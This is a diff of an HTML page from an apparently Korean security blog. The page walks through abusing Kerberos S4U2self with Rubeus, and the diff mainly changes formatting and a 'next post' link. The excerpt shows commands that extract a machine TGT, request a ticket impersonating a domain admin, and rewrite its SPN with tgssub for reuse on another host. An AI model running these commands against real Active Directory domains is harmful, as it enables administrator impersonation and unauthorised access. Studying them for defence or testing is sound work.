@@ -251,16 +251,13 @@
 </ol>
 <p>S4U2self&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; TGT &#xB610;&#xB294; &#xCEF4;&#xD4E8;&#xD130; &#xACC4;&#xC815;&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xCEF4;&#xD4E8;&#xD130; &#xACC4;&#xC815;&#xC758; TGT&#xB294; Rubues&#xC758;<code>tgt::deleg</code> trick&#xC744; &#xD1B5;&#xD574; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgtdeleg /nowrap&quot;</span></code></pre>
-
-<ol start="2">
+<ol>
 <li>SPN &#xC218;&#xC815;</li>
 </ol>
 <p>&#xC704;&#xC758; TGT&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; S4U2self&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB3C4;&#xBA54;&#xC778; &#xAD00;&#xB9AC;&#xC790;&#xC5D0; &#xB300;&#xD55C; &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;s4u /self /nowrap /impersonateuser:doadmin /ticket:base64blob&quot;</span></code></pre>
-
 <p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; S4U2self&#xB97C; &#xD1B5;&#xD574; &#xAC00;&#xC838;&#xC628; &#xD2F0;&#xCF13;&#xC758; SPN&#xC740; &#xD574;&#xCEE4;&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC778;  <code>Computername$</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC720;&#xD6A8;&#xD55C; SPN&#xC774; &#xC544;&#xB2C8;&#xBBC0;&#xB85C; &#xD2F0;&#xCF13;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC;, <code>tgssub</code>&#xC640; <code>/altservice</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgssub /altservice:http/adsec-00.contoso.com /ticket:base64blob&quot;</span></code></pre>
-
 <p>&#xADF8; &#xD6C4; &#xB2E4;&#xB978; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xD2F0;&#xCF13;&#xC744; &#xBCF5;&#xC0AC;&#xD574; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="https://cyberstoph.org/img/7_tgssub_ptt_2.png" srcset="/img/loading.gif" alt="tgtdeleg"></p>
 
@@ -337,8 +334,8 @@
                 <article class="post-next col-6">
                   
                   
-                  <a href="/2021/07/04/j0ker/2021-07-04/">
-                    <span class="hidden-mobile">[하루한줄] CVE-2020-1170 - Microsoft Windows Defender Elevation of Privilege Vulnerability</span>
+                  <a href="/2021/07/04/fabu1ous/50cve/">
+                    <span class="hidden-mobile">[Translation] 50 CVEs in 50 Days: Fuzzing Adobe Reader</span>
                     <span class="visible-mobile">Next</span>
                     <i class="iconfont icon-arrowright"></i>
                   </a>
